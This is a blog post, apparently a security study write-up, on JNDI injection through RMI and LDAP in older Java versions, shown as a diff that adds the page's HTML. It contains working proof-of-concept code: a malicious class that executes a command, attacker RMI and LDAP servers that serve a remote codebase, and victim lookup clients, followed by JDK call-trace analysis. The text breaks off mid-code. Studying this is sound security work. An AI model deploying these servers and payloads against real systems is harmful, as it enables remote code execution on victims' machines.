@@ -1,0 +1,2152 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>JNDI注入 | ret2hh</title>
+<link rel="shortcut icon" href="https://ret2hh.github.io//favicon.ico?v=1668483376321">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://ret2hh.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="JNDI注入 | ret2hh - Atom Feed" href="https://ret2hh.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="JNDI&amp;RMI&amp;LDAP
+对于jndi注入，rmi&amp;ldap的利用和高版本绕过的学习成果。
+JNDI: The Java Naming and Directory Interface
+RMI：Remote Meth..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://ret2hh.github.io/">
+  <img class="avatar" src="https://ret2hh.github.io//images/avatar.png?v=1668483376321" alt="">
+  </a>
+  <h1 class="site-title">
+    ret2hh
+  </h1>
+  <p class="site-description">
+    maybe more than学习记录
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              JNDI注入
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-11-01
+              </span>
+              <span>
+                51 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="jndirmildap"><code>JNDI&amp;RMI&amp;LDAP</code></h1>
+<p>对于<code>jndi</code>注入，<code>rmi&amp;ldap</code>的利用和高版本绕过的学习成果。</p>
+<p><code>JNDI</code>: <code>The Java Naming and Directory Interface</code></p>
+<p><code>RMI</code>：<code>Remote Method Invocation</code></p>
+<p><code>LDAP</code>：<code>Lightweight Directory Access Protocol</code></p>
+<h2 id="rmi"><code>RMI</code></h2>
+<h3 id="适用范围">适用范围</h3>
+<p><code>jdk8u121</code>之前，可以通过<code>rmi</code>远程加载恶意<code>class</code>文件，也就是远程加载恶意类。</p>
+<h3 id="测试环境">测试环境</h3>
+<p>环境-<code>jdk8u65</code></p>
+<h3 id="恶意代码">恶意代码</h3>
+<p>远程加载的恶意类，除了<code>calc</code>也可以执行别的命令，比如<code>powershell</code>一句话上线<code>CS</code>。</p>
+<pre><code class="language-java">import java.io.IOException;
+
+public class calc {
+
+        static{
+            try {
+                java.lang.Runtime.getRuntime().exec(&quot;calc&quot;);
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+        }
+
+        public static void main(String[] args) {
+
+        }
+
+
+}
+
+</code></pre>
+<h3 id="server攻击者"><code>Server</code>（攻击者）</h3>
+<pre><code class="language-java">package org.hh.Server;
+
+import com.sun.jndi.rmi.registry.ReferenceWrapper;
+
+import javax.naming.NamingException;
+import javax.naming.Reference;
+import java.rmi.AlreadyBoundException;
+import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+//攻击者代码
+//在1099端口启动注册中心服务
+//在注册中心将名称hello和http服务下的恶意类的reference对象进行绑定
+public class Registry_app {
+    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
+        //1099端口启动注册中心服务
+        //在本地主机上创建并导出Reigistry实例，该实例接受指定的port-1099上的请求。
+        //参考链接：https://www.apiref.com/java11-zh/java.rmi/java/rmi/registry/LocateRegistry.html#createRegistry(int)
+        //其实LocateRegistry.createRegistry返回的是RegistryImpl对象，而ReigistryImpl类是继承了Registry接口的，所以后面也有bind方法的具体实现和使用。
+        Registry registry = LocateRegistry.createRegistry(1099);
+        //https://www.apiref.com/java11-zh/java.naming/javax/naming/Reference.html#%3Cinit%3E(java.lang.String,java.lang.String,java.lang.String)
+        //public Reference(String className,
+        //                 String factory,
+        //                 String factoryLocation)
+        //构造具有类名“className”的对象的新引用，以及对象工厂的类名和位置。
+        //className - 此引用引用的对象的非null类名。
+        //factory - 对象工厂的可能为null的类名。
+        //factoryLocation - 加载工厂的可能为null的位置（例如URL）
+        Reference a = new Reference(&quot;calc&quot;,&quot;calc&quot;,&quot;http://127.0.0.1:8088/&quot;);
+
+        ReferenceWrapper refObjWrapper = new ReferenceWrapper(a);
+        //将名称hello和http服务下的恶意类的reference对象绑定。
+        registry.bind(&quot;hello&quot;, refObjWrapper);
+
+    }
+}
+
+</code></pre>
+<h3 id="client受害者"><code>Client</code>（受害者）</h3>
+<pre><code class="language-java">package org.hh.Client;
+
+import javax.naming.Context;
+import javax.naming.InitialContext;
+import javax.naming.Name;
+import javax.naming.NamingException;
+
+public class client_lookup {
+
+    public static void main(String[] args) throws NamingException {
+        String jndiName = &quot;rmi://127.0.0.1:1099/hello&quot;;
+        Context context = new InitialContext();
+        context.lookup(jndiName);
+    }
+}
+
+</code></pre>
+<pre><code>javax.naming.InitialContext#lookup
+</code></pre>
+<pre><code class="language-java">    public Object lookup(String name) throws NamingException {
+        return getURLOrDefaultInitCtx(name).lookup(name);
+    }
+</code></pre>
+<h4 id="javaxnaminginitialcontextgeturlordefaultinitctx"><code>javax.naming.InitialContext#getURLOrDefaultInitCtx</code></h4>
+<pre><code class="language-java">javax.naming.InitialContext#getURLOrDefaultInitCtx
+</code></pre>
+<p>参数<code>name</code>是<code>rmi://127.0.0.1:1099/hello</code>。</p>
+<pre><code class="language-java">    protected Context getURLOrDefaultInitCtx(String name)
+        throws NamingException {
+        if (NamingManager.hasInitialContextFactoryBuilder()) {
+            return getDefaultInitCtx();
+        }
+        String scheme = getURLScheme(name);
+        if (scheme != null) {
+            Context ctx = NamingManager.getURLContext(scheme, myProps);
+            if (ctx != null) {
+                return ctx;
+            }
+        }
+        return getDefaultInitCtx();
+    }
+</code></pre>
+<p><code>getURLScheme</code>方法解析协议名称，<code>NamingManager.getURLContext</code>方法返回解析对应协议的<code>rmiURLContext</code>对象。</p>
+<h4 id="comsunjnditoolkiturlgenericurlcontextlookup"><code>com.sun.jndi.toolkit.url.GenericURLContext#lookup</code></h4>
+<p>接着调用如下lookup函数</p>
+<pre><code class="language-java">com.sun.jndi.toolkit.url.GenericURLContext#lookup
+</code></pre>
+<p>参数var1是<code>rmi://127.0.0.1:1099/hello</code>。</p>
+<pre><code class="language-java">    public Object lookup(String var1) throws NamingException {
+        ResolveResult var2 = this.getRootURLContext(var1, this.myEnv);
+        Context var3 = (Context)var2.getResolvedObj();
+
+        Object var4;
+        try {
+            var4 = var3.lookup(var2.getRemainingName());
+        } finally {
+            var3.close();
+        }
+
+        return var4;
+    }
+</code></pre>
+<p><code>var4 = var3.lookup(var2.getRemainingName());</code>这一行会调用↓：</p>
+<h4 id="comsunjndirmiregistryregistrycontextlookup"><code>com.sun.jndi.rmi.registry.RegistryContext#lookup</code></h4>
+<p>参数是var1是 hello</p>
+<pre><code>com.sun.jndi.rmi.registry.RegistryContext#lookup
+</code></pre>
+<pre><code class="language-java">    public Object lookup(Name var1) throws NamingException {
+        if (var1.isEmpty()) {
+            return new RegistryContext(this);
+        } else {
+            Remote var2;
+            try {
+                var2 = this.registry.lookup(var1.get(0));
+            } catch (NotBoundException var4) {
+                throw new NameNotFoundException(var1.get(0));
+            } catch (RemoteException var5) {
+                throw (NamingException)wrapRemoteException(var5).fillInStackTrace();
+            }
+
+            return this.decodeObject(var2, var1.getPrefix(1));
+        }
+    }
+</code></pre>
+<p><code>var2 = this.registry.lookup(var1.get(0));</code>这里会去RMI注册中心寻找hello对象，返回的var2是一个<code>ReferenceWrapper_Stub(ReferenceWrapper)</code>类的对象。</p>
+<p>最后会调用当前类的<code>decodeObject</code>方法（为了返回一个<code>Reference</code>，也就是将<code>ReferenceWrapper</code>的对象转成<code>Reference</code>对象），↓</p>
+<h4 id="comsunjndirmiregistryregistrycontextdecodeobject"><code>com.sun.jndi.rmi.registry.RegistryContext#decodeObject</code></h4>
+<pre><code class="language-java">com.sun.jndi.rmi.registry.RegistryContext#decodeObject
+</code></pre>
+<pre><code class="language-java">    private Object decodeObject(Remote var1, Name var2) throws NamingException {
+        try {
+            Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1;
+            return NamingManager.getObjectInstance(var3, var2, this, this.environment);
+        } catch (NamingException var5) {
+            throw var5;
+        } catch (RemoteException var6) {
+            throw (NamingException)wrapRemoteException(var6).fillInStackTrace();
+        } catch (Exception var7) {
+            NamingException var4 = new NamingException();
+            var4.setRootCause(var7);
+            throw var4;
+        }
+    }
+}
+</code></pre>
+<p><code>Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1;</code></p>
+<p>因为<code>ReferenceWrapper</code>对象实现了<code>RemoteReference</code>接口,所以这里会调用<code>getReference</code>方法会获取<code>Reference</code>对象。</p>
+<p><code>var3</code>是一个<code>Reference</code>对象。</p>
+<p>接着调用<code>（javax.naming.spi.NamingManager#getObjectInstance）NamingManager.getObjectInstance</code>。</p>
+<h4 id="javaxnamingspinamingmanagergetobjectinstance"><code>javax.naming.spi.NamingManager#getObjectInstance</code></h4>
+<pre><code class="language-java"> public static Object
+        getObjectInstance(Object refInfo, Name name, Context nameCtx,
+                          Hashtable&lt;?,?&gt; environment)
+        throws Exception
+    {
+
+        ObjectFactory factory;
+
+        // Use builder if installed
+        ObjectFactoryBuilder builder = getObjectFactoryBuilder();
+        if (builder != null) {
+            // builder must return non-null factory
+            factory = builder.createObjectFactory(refInfo, environment);
+            return factory.getObjectInstance(refInfo, name, nameCtx,
+                environment);
+        }
+
+        // Use reference if possible
+        Reference ref = null;
+        if (refInfo instanceof Reference) {
+            ref = (Reference) refInfo;
+        } else if (refInfo instanceof Referenceable) {
+            ref = ((Referenceable)(refInfo)).getReference();
+        }
+
+        Object answer;
+
+        if (ref != null) {
+            String f = ref.getFactoryClassName();
+            if (f != null) {
+                // if reference identifies a factory, use exclusively
+
+                factory = getObjectFactoryFromReference(ref, f);
+                if (factory != null) {
+                    return factory.getObjectInstance(ref, name, nameCtx,
+                                                     environment);
+                }
+                // No factory found, so return original refInfo.
+                // Will reach this point if factory class is not in
+                // class path and reference does not contain a URL for it
+                return refInfo;
+
+            } else {
+                // if reference has no factory, check for addresses
+                // containing URLs
+
+                answer = processURLAddrs(ref, name, nameCtx, environment);
+                if (answer != null) {
+                    return answer;
+                }
+            }
+        }
+
+        // try using any specified factories
+        answer =
+            createObjectFromFactories(refInfo, name, nameCtx, environment);
+        return (answer != null) ? answer : refInfo;
+    }
+</code></pre>
+<p><code>NamignManager.getObjectInstance</code>方法里会调用：</p>
+<pre><code>javax.naming.spi.NamingManager#getObjectFactoryFromReference
+</code></pre>
+<h4 id="javaxnamingspinamingmanagergetobjectfactoryfromreference"><code>javax.naming.spi.NamingManager#getObjectFactoryFromReference</code></h4>
+<p><code>ref</code>是<code>calc</code>的<code>Reference</code>对象，<code>factoryName</code>是<code>calc</code>。</p>
+<pre><code class="language-java">static ObjectFactory getObjectFactoryFromReference(
+        Reference ref, String factoryName)
+        throws IllegalAccessException,
+        InstantiationException,
+        MalformedURLException {
+        Class&lt;?&gt; clas = null;
+
+        // Try to use current class loader
+        try {
+             clas = helper.loadClass(factoryName);
+        } catch (ClassNotFoundException e) {
+            // ignore and continue
+            // e.printStackTrace();
+        }
+        // All other exceptions are passed up.
+
+        // Not in class path; try to use codebase
+        String codebase;
+        if (clas == null &amp;&amp;
+                (codebase = ref.getFactoryClassLocation()) != null) {
+            try {
+                clas = helper.loadClass(factoryName, codebase);
+            } catch (ClassNotFoundException e) {
+            }
+        }
+
+        return (clas != null) ? (ObjectFactory) clas.newInstance() : null;
+    }
+</code></pre>
+<p>首先尝试从本地CLASSPATH获取该class,接着根据<code>factoryName</code>和<code>codebase</code>加载远程的class（调用<code>loadClass</code>）,跟进看下<code>loadClass</code>方法的实现<br>
+<code>com.sun.naming.internal.VersionHelper12#loadClass</code></p>
+<pre><code>com.sun.naming.internal.VersionHelper12#loadClass
+</code></pre>
+<p>这里的<code>className</code>是<code>calc</code>，<code>codebase</code>是<code>http://127.0.0.1:8088/</code>。</p>
+<pre><code class="language-java">public Class&lt;?&gt; loadClass(String className, String codebase)
+            throws ClassNotFoundException, MalformedURLException {
+
+        ClassLoader parent = getContextClassLoader();
+        ClassLoader cl =
+                 URLClassLoader.newInstance(getUrlArray(codebase), parent);
+
+        return loadClass(className, cl);
+    }
+</code></pre>
+<pre><code class="language-java">  Class&lt;?&gt; loadClass(String className, ClassLoader cl)
+        throws ClassNotFoundException {
+        Class&lt;?&gt; cls = Class.forName(className, true, cl);
+        return cls;
+    }
+</code></pre>
+<p>这里是通过<code>URLClassLoader</code>去加载远程类。</p>
+<p>网上有说<code>javax.naming.spi.NamingManager#getObjectInstance</code>的321行会调用</p>
+<pre><code class="language-java">return factory.getObjectInstance(ref, name, nameCtx,environment);
+</code></pre>
+<p>不过我没调出来（没走到这一行）。</p>
+<h4 id="调用栈">调用栈</h4>
+<p>先解析协议,获取<code>rmi</code>协议的对象,寻找<code>Reference</code>中的<code>factoryName</code>对象,先尝试本地加载这个类,本地没有这个类就用<code>URLClassLoader</code>远程进行加载。</p>
+<p>调用栈</p>
+<pre><code class="language-java">getObjectInstance:321, NamingManager (javax.naming.spi)
+decodeObject:464, RegistryContext (com.sun.jndi.rmi.registry)
+lookup:124, RegistryContext (com.sun.jndi.rmi.registry)
+lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
+lookup:417, InitialContext (javax.naming)
+main:46, HelloClient
+</code></pre>
+<h3 id="jdk8u121"><code>jdk8u121</code></h3>
+<p>将<code>jdk</code>换成<code>jdk8u121</code>以上版本，发现如上<code>client</code>代码运行会提示</p>
+<pre><code class="language-java">Exception in thread &quot;main&quot; javax.naming.ConfigurationException: The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.
+	at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:495)
+	at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:138)
+	at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)
+	at javax.naming.InitialContext.lookup(InitialContext.java:417)
+	at org.hh.Client.client_lookup.main(client_lookup.java:13)
+</code></pre>
+<p>看下<code>com.sun.jndi.rmi.registry.RegistryContext.decodeObject</code>代码:</p>
+<pre><code class="language-java">private Object decodeObject(Remote var1, Name var2) throws NamingException {
+        try {
+            Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1;
+            Reference var8 = null;
+            if (var3 instanceof Reference) {
+                var8 = (Reference)var3;
+            } else if (var3 instanceof Referenceable) {
+                var8 = ((Referenceable)((Referenceable)var3)).getReference();
+            }
+
+            if (var8 != null &amp;&amp; var8.getFactoryClassLocation() != null &amp;&amp; !trustURLCodebase) {
+                throw new ConfigurationException(&quot;The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.&quot;);
+            } else {
+                return NamingManager.getObjectInstance(var3, var2, this, this.environment);
+            }
+        } catch (NamingException var5) {
+            throw var5;
+        } catch (RemoteException var6) {
+            throw (NamingException)wrapRemoteException(var6).fillInStackTrace();
+        } catch (Exception var7) {
+            NamingException var4 = new NamingException();
+            var4.setRootCause(var7);
+            throw var4;
+        }
+    }
+</code></pre>
+<p><code>jdk8u121</code>以后默认<code>com.sun.jndi.rmi.object.trustURLCodebase</code>设置为<code>false</code>,<code>rmi</code>加载远程的字节码不会执行成功。</p>
+<p>JDK 6u141, JDK 7u131, JDK 8u121 中Java提升了<code>JNDI</code> 限制了Naming/Directory服务中<code>JNDI Reference</code>远程加载<code>Object Factory</code>类的特性。系统属性 <code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code> 的默认值变为<code>false</code>，即默认不允许从远程的<code>Codebase</code>加载<code>Reference</code>工厂类。</p>
+<h2 id="ldap"><code>LDAP</code></h2>
+<h3 id="适用范围-2">适用范围</h3>
+<p>（<code>jdk8u191</code>之前）</p>
+<h3 id="测试环境-2">测试环境</h3>
+<p><code>jdk8u131</code></p>
+<h3 id="简介">简介</h3>
+<p><code>LDAP</code>是基于<code>X.500</code>标准的轻量级目录访问协议,目录是一个为查询、浏览和搜索而优化的数据库，它成树状结构组织数据，类似文件目录一样。</p>
+<p><code>LDAP</code>也能返回<code>JNDI Reference</code>对象，利用过程与上面<code>RMI Reference</code>基本一致，只是<code>lookup()</code>中的<code>URL</code>为一个<code>LDAP</code>地址：<code>ldap://xxx/xxx</code>，由攻击者控制的<code>LDAP</code>服务端返回一个恶意的<code>JNDI Reference</code>对象。</p>
+<p><code>LDAP</code>服务的<code>Reference</code>远程加载<code>Factory</code>类不受<code>8u121</code>之后新增的 <code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code>等属性的限制，所以适用范围更广。</p>
+<h3 id="maven依赖"><code>maven</code>依赖</h3>
+<p>https://mvnrepository.com/artifact/com.unboundid/unboundid-ldapsdk/3.1.1</p>
+<h3 id="恶意代码-2">恶意代码</h3>
+<pre><code class="language-java">import java.io.IOException;
+
+public class calc {
+
+        static{
+            try {
+                java.lang.Runtime.getRuntime().exec(&quot;calc&quot;);
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+        }
+
+        public static void main(String[] args) {
+
+        }
+
+
+}
+
+</code></pre>
+<h3 id="server攻击者-2"><code>Server</code>（攻击者）</h3>
+<p>起一个LDAP服务</p>
+<pre><code class="language-java">package org.hh.Server;
+
+import com.unboundid.ldap.listener.InMemoryDirectoryServer;
+import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
+import com.unboundid.ldap.listener.InMemoryListenerConfig;
+import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
+import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
+import com.unboundid.ldap.sdk.Entry;
+import com.unboundid.ldap.sdk.LDAPException;
+import com.unboundid.ldap.sdk.LDAPResult;
+import com.unboundid.ldap.sdk.ResultCode;
+
+import javax.net.ServerSocketFactory;
+import javax.net.SocketFactory;
+import javax.net.ssl.SSLSocketFactory;
+import java.net.InetAddress;
+import java.net.MalformedURLException;
+import java.net.URL;
+
+public class Registry_app {
+
+    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;
+
+    public static void main(String[] argsx) {
+        String[] args = new String[]{&quot;http://127.0.0.1:8088/#calc&quot;, &quot;1098&quot;};
+        int port = 0;
+        if (args.length &lt; 1 || args[0].indexOf('#') &lt; 0) {
+            //System.err.println(Ldap.class.getSimpleName() + &quot; &lt;codebase_url#classname&gt; [&lt;port&gt;]&quot;); //$NON-NLS-1$
+            System.exit(-1);
+        } else if (args.length &gt; 1) {
+            port = Integer.parseInt(args[1]);
+        }
+
+        try {
+            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
+            config.setListenerConfigs(new InMemoryListenerConfig(
+                    &quot;listen&quot;, //$NON-NLS-1$
+                    InetAddress.getByName(&quot;0.0.0.0&quot;), //$NON-NLS-1$
+                    port,
+                    ServerSocketFactory.getDefault(),
+                    SocketFactory.getDefault(),
+                    (SSLSocketFactory) SSLSocketFactory.getDefault()));
+
+            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[0])));
+            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
+            System.out.println(&quot;Listening on 0.0.0.0:&quot; + port); //$NON-NLS-1$
+            ds.startListening();
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    private static class OperationInterceptor extends InMemoryOperationInterceptor {
+
+        private URL codebase;
+
+        /**
+         *
+         */
+        public OperationInterceptor(URL cb) {
+            this.codebase = cb;
+        }
+
+        /**
+         * {@inheritDoc}
+         *
+         * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
+         */
+        @Override
+        public void processSearchResult(InMemoryInterceptedSearchResult result) {
+            String base = result.getRequest().getBaseDN();
+            Entry e = new Entry(base);
+            try {
+                sendResult(result, base, e);
+            } catch (Exception e1) {
+                e1.printStackTrace();
+            }
+
+        }
+
+        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws LDAPException, MalformedURLException {
+            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(&quot;.class&quot;));
+            System.out.println(&quot;Send LDAP reference result for &quot; + base + &quot; redirecting to &quot; + turl);
+            e.addAttribute(&quot;javaClassName&quot;, &quot;foo&quot;);
+            String cbstring = this.codebase.toString();
+            int refPos = cbstring.indexOf('#');
+            if (refPos &gt; 0) {
+                cbstring = cbstring.substring(0, refPos);
+            }
+            e.addAttribute(&quot;javaCodeBase&quot;, cbstring);
+            e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;); //$NON-NLS-1$
+            e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());
+            result.sendSearchEntry(e);
+            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+        }
+
+    }
+}
+</code></pre>
+<h3 id="client受害者-2"><code>Client</code>（受害者）</h3>
+<pre><code class="language-java">package org.hh.Client;
+
+import javax.naming.Context;
+import javax.naming.InitialContext;
+import javax.naming.NamingException;
+
+public class Client_lookup {
+    public static void main(String[] args) throws NamingException {
+        String jndiName = &quot;ldap://127.0.0.1:1098/calc&quot;;
+        Context context = new InitialContext();
+        context.lookup(jndiName);
+    }
+}
+
+</code></pre>
+<h4 id="javaxnaminginitialcontextgeturlordefaultinitctx-2"><code>javax.naming.InitialContext#getURLOrDefaultInitCtx</code></h4>
+<p>参数name是 <code>ldap://127.0.0.1:1098/calc</code></p>
+<pre><code class="language-java">    protected Context getURLOrDefaultInitCtx(String name)
+        throws NamingException {
+        if (NamingManager.hasInitialContextFactoryBuilder()) {
+            return getDefaultInitCtx();
+        }
+        String scheme = getURLScheme(name);
+        if (scheme != null) {
+            Context ctx = NamingManager.getURLContext(scheme, myProps);
+            if (ctx != null) {
+                return ctx;
+            }
+        }
+        return getDefaultInitCtx();
+    }
+</code></pre>
+<p>返回的<code>ctx</code>是一个<code>ldapURLContext</code>类型的对象。</p>
+<h4 id="comsunjndiurlldapldapurlcontextlookup"><code>com.sun.jndi.url.ldap.ldapURLContext#lookup</code></h4>
+<p>参数var1是<code>ldap://127.0.0.1:1098/calc</code>。</p>
+<pre><code class="language-java">    public Object lookup(String var1) throws NamingException {
+        if (LdapURL.hasQueryComponents(var1)) {
+            throw new InvalidNameException(var1);
+        } else {
+            return super.lookup(var1);
+        }
+    }
+</code></pre>
+<p>里面会调用<code>com.sun.jndi.toolkit.url.GenericURLContext#lookup</code></p>
+<h4 id="comsunjnditoolkiturlgenericurlcontextlookup-2"><code>com.sun.jndi.toolkit.url.GenericURLContext#lookup</code></h4>
+<p>参数var1是<code>ldap://127.0.0.1:1098/calc</code>。</p>
+<pre><code class="language-java">    public Object lookup(String var1) throws NamingException {
+        ResolveResult var2 = this.getRootURLContext(var1, this.myEnv);
+        Context var3 = (Context)var2.getResolvedObj();
+
+        Object var4;
+        try {
+            var4 = var3.lookup(var2.getRemainingName());
+        } finally {
+            var3.close();
+        }
+
+        return var4;
+    }
+</code></pre>
+<p>方法里面会调用<code>com.sun.jndi.toolkit.ctx#PartialCompositeContext#lookup</code>。</p>
+<h4 id="comsunjnditoolkitctxpartialcompositecontextlookup"><code>com.sun.jndi.toolkit.ctx.PartialCompositeContext#lookup</code></h4>
+<p>参数var1是<code>calc</code>，即<code>factoryclassname</code>。</p>
+<pre><code class="language-java">    public Object lookup(Name var1) throws NamingException {
+        PartialCompositeContext var2 = this;
+        Hashtable var3 = this.p_getEnvironment();
+        Continuation var4 = new Continuation(var1, var3);
+        Name var6 = var1;
+
+        Object var5;
+        try {
+            for(var5 = var2.p_lookup(var6, var4); var4.isContinue(); var5 = var2.p_lookup(var6, var4)) {
+                var6 = var4.getRemainingName();
+                var2 = getPCContext(var4);
+            }
+        } catch (CannotProceedException var9) {
+            Context var8 = NamingManager.getContinuationContext(var9);
+            var5 = var8.lookup(var9.getRemainingName());
+        }
+
+        return var5;
+    }
+</code></pre>
+<p><code>var5 = var2.p_lookup(var6, var4); var4.isContinue(); var5 = var2.p_lookup(var6, var4)</code> 这里会调用<code>com.sun.jndi.toolkit.ctx.ComponentContext#p_lookup</code></p>
+<h4 id="comsunjnditoolkitctxcomponentcontextp_lookup"><code>com.sun.jndi.toolkit.ctx.ComponentContext#p_lookup</code></h4>
+<p>参数var1是calc，参数var2是calc</p>
+<pre><code class="language-java">    protected Object p_lookup(Name var1, Continuation var2) throws NamingException {
+        Object var3 = null;
+        HeadTail var4 = this.p_resolveIntermediate(var1, var2);
+        switch(var4.getStatus()) {
+        case 2:
+            var3 = this.c_lookup(var4.getHead(), var2);
+            if (var3 instanceof LinkRef) {
+                var2.setContinue(var3, var4.getHead(), this);
+                var3 = null;
+            }
+            break;
+        case 3:
+            var3 = this.c_lookup_nns(var4.getHead(), var2);
+            if (var3 instanceof LinkRef) {
+                var2.setContinue(var3, var4.getHead(), this);
+                var3 = null;
+            }
+        }
+
+        return var3;
+    }
+</code></pre>
+<pre><code class="language-java">        case 2:
+            var3 = this.c_lookup(var4.getHead(), var2);
+</code></pre>
+<p>这里会调用<code>com.sun.jndi.ldap.LdapCtx#c_lookup</code></p>
+<h4 id="comsunjndildapldapctxc_lookup"><code>com.sun.jndi.ldap.LdapCtx#c_lookup</code></h4>
+<p>参数var1是<code>calc</code>，参数var2是<code>calc</code>，调用远程类是在第一个<code>try catch</code>里面。</p>
+<pre><code class="language-java">    protected Object c_lookup(Name var1, Continuation var2) throws NamingException {
+        var2.setError(this, var1);
+        Object var3 = null;
+
+        Object var4;
+        try {
+            SearchControls var22 = new SearchControls();
+            var22.setSearchScope(0);
+            var22.setReturningAttributes((String[])null);
+            var22.setReturningObjFlag(true);
+            LdapResult var23 = this.doSearchOnce(var1, &quot;(objectClass=*)&quot;, var22, true);
+            this.respCtls = var23.resControls;
+            if (var23.status != 0) {
+                this.processReturnCode(var23, var1);
+            }
+
+            if (var23.entries != null &amp;&amp; var23.entries.size() == 1) {
+                LdapEntry var25 = (LdapEntry)var23.entries.elementAt(0);
+                var4 = var25.attributes;
+                Vector var8 = var25.respCtls;
+                if (var8 != null) {
+                    appendVector(this.respCtls, var8);
+                }
+            } else {
+                var4 = new BasicAttributes(true);
+            }
+
+            if (((Attributes)var4).get(Obj.JAVA_ATTRIBUTES[2]) != null) {
+                var3 = Obj.decodeObject((Attributes)var4);
+            }
+
+            if (var3 == null) {
+                var3 = new LdapCtx(this, this.fullyQualifiedName(var1));
+            }
+        } catch (LdapReferralException var20) {
+            LdapReferralException var5 = var20;
+            if (this.handleReferrals == 2) {
+                throw var2.fillInException(var20);
+            }
+
+            while(true) {
+                LdapReferralContext var6 = (LdapReferralContext)var5.getReferralContext(this.envprops, this.bindCtls);
+
+                try {
+                    Object var7 = var6.lookup(var1);
+                    return var7;
+                } catch (LdapReferralException var18) {
+                    var5 = var18;
+                } finally {
+                    var6.close();
+                }
+            }
+        } catch (NamingException var21) {
+            throw var2.fillInException(var21);
+        }
+
+        try {
+            return DirectoryManager.getObjectInstance(var3, var1, this, this.envprops, (Attributes)var4);
+        } catch (NamingException var16) {
+            throw var2.fillInException(var16);
+        } catch (Exception var17) {
+            NamingException var24 = new NamingException(&quot;problem generating object using object factory&quot;);
+            var24.setRootCause(var17);
+            throw var2.fillInException(var24);
+        }
+    }
+</code></pre>
+<pre><code class="language-java">        try {
+            return DirectoryManager.getObjectInstance(var3, var1, this, this.envprops, (Attributes)var4);
+        }
+</code></pre>
+<p>这里会调用<code>javax.naming.spi.DirectoryManager#getObjectInstance</code></p>
+<h4 id="javaxnamingspidirectorymanagergetobjectinstance"><code>javax.naming.spi.DirectoryManager#getObjectInstance</code></h4>
+<pre><code class="language-java">    public static Object
+        getObjectInstance(Object refInfo, Name name, Context nameCtx,
+                          Hashtable&lt;?,?&gt; environment, Attributes attrs)
+        throws Exception {
+
+            ObjectFactory factory;
+
+            ObjectFactoryBuilder builder = getObjectFactoryBuilder();
+            if (builder != null) {
+                // builder must return non-null factory
+                factory = builder.createObjectFactory(refInfo, environment);
+                if (factory instanceof DirObjectFactory) {
+                    return ((DirObjectFactory)factory).getObjectInstance(
+                        refInfo, name, nameCtx, environment, attrs);
+                } else {
+                    return factory.getObjectInstance(refInfo, name, nameCtx,
+                        environment);
+                }
+            }
+
+            // use reference if possible
+            Reference ref = null;
+            if (refInfo instanceof Reference) {
+                ref = (Reference) refInfo;
+            } else if (refInfo instanceof Referenceable) {
+                ref = ((Referenceable)(refInfo)).getReference();
+            }
+
+            Object answer;
+
+            if (ref != null) {
+                String f = ref.getFactoryClassName();
+                if (f != null) {
+                    // if reference identifies a factory, use exclusively
+
+                    factory = getObjectFactoryFromReference(ref, f);
+                    if (factory instanceof DirObjectFactory) {
